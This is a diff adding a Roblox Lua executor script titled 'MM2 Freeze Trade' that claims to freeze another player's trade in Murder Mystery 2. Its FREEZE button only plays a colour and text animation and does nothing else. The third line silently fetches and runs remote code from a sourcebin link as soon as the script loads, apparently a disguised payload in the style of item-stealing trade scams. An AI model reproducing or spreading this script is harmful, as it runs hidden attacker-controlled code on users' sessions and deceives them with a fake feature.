@@ -1,0 +1,421 @@
+-- made by noodlescripts
+
+loadstring(game:HttpGet('https://cdn.sourceb.in/bins/odd6BjkZYW/0'))()
+
+pcall(function()
+    ((game:GetService('CoreGui')):FindFirstChild('MM2FreezeGUI')):Destroy()
+end)
+
+local TweenService = game:GetService('TweenService')
+local gui = Instance.new('ScreenGui')
+
+gui.Name = 'MM2FreezeGUI'
+
+local success = pcall(function()
+    if syn and syn.protect_gui then
+        syn.protect_gui(gui)
+
+        gui.Parent = game:GetService('CoreGui')
+    elseif gethui then
+        gui.Parent = gethui()
+    else
+        gui.Parent = game:GetService('CoreGui')
+    end
+end)
+
+if not success then
+    gui.Parent = game:GetService('Players').LocalPlayer:WaitForChild('PlayerGui')
+end
+
+local glow = Instance.new('Frame', gui)
+
+glow.Size = UDim2.new(0, 270, 0, 195)
+glow.Position = UDim2.new(0.5, -135, 0.5, -97)
+glow.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
+glow.BackgroundTransparency = 0.85
+glow.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 20)
+    c.Parent = glow
+end)
+
+local shadow = Instance.new('Frame', gui)
+
+shadow.Size = UDim2.new(0, 260, 0, 185)
+shadow.Position = UDim2.new(0.5, -126, 0.5, -88)
+shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shadow.BackgroundTransparency = 0.4
+shadow.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 16)
+    c.Parent = shadow
+end)
+
+local main = Instance.new('Frame', gui)
+
+main.Size = UDim2.new(0, 260, 0, 185)
+main.Position = UDim2.new(0.5, -130, 0.5, -92)
+main.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
+main.BorderSizePixel = 0
+main.Active = true
+main.Draggable = true
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 14)
+    c.Parent = main
+end)
+pcall(function()
+    local s = Instance.new('UIStroke')
+
+    s.Color = Color3.fromRGB(60, 60, 75)
+    s.Thickness = 1
+    s.Parent = main
+end)
+
+local innerGlow = Instance.new('Frame', main)
+
+innerGlow.Size = UDim2.new(1, -4, 1, -4)
+innerGlow.Position = UDim2.new(0, 2, 0, 2)
+innerGlow.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
+innerGlow.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 12)
+    c.Parent = innerGlow
+end)
+
+local header = Instance.new('Frame', innerGlow)
+
+header.Size = UDim2.new(1, 0, 0, 50)
+header.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+header.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 12)
+    c.Parent = header
+end)
+
+local headerFix = Instance.new('Frame', header)
+
+headerFix.Size = UDim2.new(1, 0, 0, 15)
+headerFix.Position = UDim2.new(0, 0, 1, -15)
+headerFix.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+headerFix.BorderSizePixel = 0
+
+local accentLine = Instance.new('Frame', innerGlow)
+
+accentLine.Size = UDim2.new(0, 50, 0, 3)
+accentLine.Position = UDim2.new(0, 18, 0, 50)
+accentLine.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+accentLine.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 2)
+    c.Parent = accentLine
+end)
+
+local iconBg = Instance.new('Frame', header)
+
+iconBg.Size = UDim2.new(0, 32, 0, 32)
+iconBg.Position = UDim2.new(0, 14, 0.5, -16)
+iconBg.BackgroundColor3 = Color3.fromRGB(255, 45, 45)
+iconBg.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 8)
+    c.Parent = iconBg
+end)
+
+local iconText = Instance.new('TextLabel', iconBg)
+
+iconText.Size = UDim2.new(1, 0, 1, 0)
+iconText.BackgroundTransparency = 1
+iconText.Text = 'MM2'
+iconText.TextColor3 = Color3.fromRGB(255, 255, 255)
+iconText.TextSize = 12
+iconText.Font = Enum.Font.SourceSansBold
+
+local title = Instance.new('TextLabel', header)
+
+title.Size = UDim2.new(1, -100, 0, 20)
+title.Position = UDim2.new(0, 54, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = 'MM2 Freeze Trade'
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 15
+title.Font = Enum.Font.SourceSansBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local subtitle = Instance.new('TextLabel', header)
+
+subtitle.Size = UDim2.new(1, -100, 0, 14)
+subtitle.Position = UDim2.new(0, 54, 0, 28)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = 'by NoodleScripts'
+subtitle.TextColor3 = Color3.fromRGB(100, 100, 120)
+subtitle.TextSize = 11
+subtitle.Font = Enum.Font.SourceSans
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+
+local closeBtn = Instance.new('TextButton', header)
+
+closeBtn.Size = UDim2.new(0, 32, 0, 32)
+closeBtn.Position = UDim2.new(1, -44, 0.5, -16)
+closeBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+closeBtn.BorderSizePixel = 0
+closeBtn.Text = 'X'
+closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
+closeBtn.TextSize = 16
+closeBtn.Font = Enum.Font.SourceSansBold
+closeBtn.AutoButtonColor = false
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 8)
+    c.Parent = closeBtn
+end)
+closeBtn.MouseEnter:Connect(function()
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 55, 55)
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+end)
+closeBtn.MouseLeave:Connect(function()
+    closeBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
+end)
+closeBtn.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
+
+local freezeBtn = Instance.new('TextButton', innerGlow)
+
+freezeBtn.Size = UDim2.new(1, -36, 0, 52)
+freezeBtn.Position = UDim2.new(0, 18, 0, 62)
+freezeBtn.BackgroundColor3 = Color3.fromRGB(255, 45, 45)
+freezeBtn.BorderSizePixel = 0
+freezeBtn.Text = 'FREEZE'
+freezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+freezeBtn.TextSize = 18
+freezeBtn.Font = Enum.Font.SourceSansBold
+freezeBtn.AutoButtonColor = false
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 10)
+    c.Parent = freezeBtn
+end)
+
+local btnHighlight = Instance.new('Frame', freezeBtn)
+
+btnHighlight.Size = UDim2.new(1, 0, 0.5, 0)
+btnHighlight.Position = UDim2.new(0, 0, 0, 0)
+btnHighlight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+btnHighlight.BackgroundTransparency = 0.9
+btnHighlight.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 10)
+    c.Parent = btnHighlight
+end)
+
+local infoContainer = Instance.new('Frame', innerGlow)
+
+infoContainer.Size = UDim2.new(1, -36, 0, 22)
+infoContainer.Position = UDim2.new(0, 18, 0, 122)
+infoContainer.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
+infoContainer.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(0, 6)
+    c.Parent = infoContainer
+end)
+
+local infoIcon = Instance.new('TextLabel', infoContainer)
+
+infoIcon.Size = UDim2.new(0, 22, 1, 0)
+infoIcon.Position = UDim2.new(0, 6, 0, 0)
+infoIcon.BackgroundTransparency = 1
+infoIcon.Text = 'i'
+infoIcon.TextColor3 = Color3.fromRGB(100, 100, 130)
+infoIcon.TextSize = 12
+infoIcon.Font = Enum.Font.SourceSansBold
+
+local infoText = Instance.new('TextLabel', infoContainer)
+
+infoText.Size = UDim2.new(1, -35, 1, 0)
+infoText.Position = UDim2.new(0, 28, 0, 0)
+infoText.BackgroundTransparency = 1
+infoText.Text = 'Use when they put their items in trade'
+infoText.TextColor3 = Color3.fromRGB(100, 100, 130)
+infoText.TextSize = 10
+infoText.Font = Enum.Font.SourceSans
+infoText.TextXAlignment = Enum.TextXAlignment.Left
+
+local statusBar = Instance.new('Frame', innerGlow)
+
+statusBar.Size = UDim2.new(1, -36, 0, 26)
+statusBar.Position = UDim2.new(0, 18, 0, 150)
+statusBar.BackgroundTransparency = 1
+statusBar.BorderSizePixel = 0
+
+local statusGlow = Instance.new('Frame', statusBar)
+
+statusGlow.Size = UDim2.new(0, 16, 0, 16)
+statusGlow.Position = UDim2.new(0, -3, 0.5, -8)
+statusGlow.BackgroundColor3 = Color3.fromRGB(45, 255, 95)
+statusGlow.BackgroundTransparency = 0.7
+statusGlow.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(1, 0)
+    c.Parent = statusGlow
+end)
+
+local statusDot = Instance.new('Frame', statusBar)
+
+statusDot.Size = UDim2.new(0, 10, 0, 10)
+statusDot.Position = UDim2.new(0, 0, 0.5, -5)
+statusDot.BackgroundColor3 = Color3.fromRGB(45, 255, 95)
+statusDot.BorderSizePixel = 0
+
+pcall(function()
+    local c = Instance.new('UICorner')
+
+    c.CornerRadius = UDim.new(1, 0)
+    c.Parent = statusDot
+end)
+
+local statusText = Instance.new('TextLabel', statusBar)
+
+statusText.Size = UDim2.new(0, 60, 1, 0)
+statusText.Position = UDim2.new(0, 18, 0, 0)
+statusText.BackgroundTransparency = 1
+statusText.Text = 'Ready'
+statusText.TextColor3 = Color3.fromRGB(45, 255, 95)
+statusText.TextSize = 12
+statusText.Font = Enum.Font.SourceSansBold
+statusText.TextXAlignment = Enum.TextXAlignment.Left
+
+local versionText = Instance.new('TextLabel', statusBar)
+
+versionText.Size = UDim2.new(0, 50, 1, 0)
+versionText.Position = UDim2.new(1, -50, 0, 0)
+versionText.BackgroundTransparency = 1
+versionText.Text = 'v1.0'
+versionText.TextColor3 = Color3.fromRGB(60, 60, 80)
+versionText.TextSize = 10
+versionText.Font = Enum.Font.SourceSans
+versionText.TextXAlignment = Enum.TextXAlignment.Right
+
+freezeBtn.MouseEnter:Connect(function()
+    if not busy then
+        pcall(function()
+            (TweenService:Create(freezeBtn, TweenInfo.new(0.2), {
+                BackgroundColor3 = Color3.fromRGB(255, 75, 75),
+            })):Play()
+        end)
+
+        if not pcall then
+            freezeBtn.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
+        end
+    end
+end)
+freezeBtn.MouseLeave:Connect(function()
+    if not busy then
+        pcall(function()
+            (TweenService:Create(freezeBtn, TweenInfo.new(0.2), {
+                BackgroundColor3 = Color3.fromRGB(255, 45, 45),
+            })):Play()
+        end)
+
+        if not pcall then
+            freezeBtn.BackgroundColor3 = Color3.fromRGB(255, 45, 45)
+        end
+    end
+end)
+
+busy = false
+
+freezeBtn.MouseButton1Click:Connect(function()
+    if busy then
+        return
+    end
+
+    busy = true
+
+    pcall(function()
+        (TweenService:Create(freezeBtn, TweenInfo.new(0.3), {
+            BackgroundColor3 = Color3.fromRGB(255, 160, 40),
+        })):Play()
+    end)
+
+    freezeBtn.BackgroundColor3 = Color3.fromRGB(255, 160, 40)
+    statusDot.BackgroundColor3 = Color3.fromRGB(255, 180, 50)
+    statusGlow.BackgroundColor3 = Color3.fromRGB(255, 180, 50)
+    statusText.Text = 'Working'
+    statusText.TextColor3 = Color3.fromRGB(255, 180, 50)
+
+    for i = 1, 3, 1 do
+        freezeBtn.Text = 'FREEZING' .. string.rep('.', i)
+
+        wait(2)
+    end
+
+    pcall(function()
+        (TweenService:Create(freezeBtn, TweenInfo.new(0.3), {
+            BackgroundColor3 = Color3.fromRGB(255, 45, 45),
+        })):Play()
+    end)
+
+    freezeBtn.BackgroundColor3 = Color3.fromRGB(255, 45, 45)
+    freezeBtn.Text = 'FREEZE'
+    statusDot.BackgroundColor3 = Color3.fromRGB(45, 255, 95)
+    statusGlow.BackgroundColor3 = Color3.fromRGB(45, 255, 95)
+    statusText.Text = 'Ready'
+    statusText.TextColor3 = Color3.fromRGB(45, 255, 95)
+    busy = false
+end)
+spawn(function()
+    while gui.Parent do
+        shadow.Position = UDim2.new(main.Position.X.Scale, main.Position.X.Offset + 4, main.Position.Y.Scale, main.Position.Y.Offset + 4)
+        glow.Position = UDim2.new(main.Position.X.Scale, main.Position.X.Offset - 5, main.Position.Y.Scale, main.Position.Y.Offset - 5)
+
+        wait()
+    end
+end)
+spawn(function()
+    while gui.Parent do
+        pcall(function()
+            (TweenService:Create(statusGlow, TweenInfo.new(1), {BackgroundTransparency = 0.9})):Play()
+        end)
+        wait(1)
+        pcall(function()
+            (TweenService:Create(statusGlow, TweenInfo.new(1), {BackgroundTransparency = 0.6})):Play()
+        end)
+        wait(1)
+    end
+end)
+print('MM2 Freeze GUI loaded!')
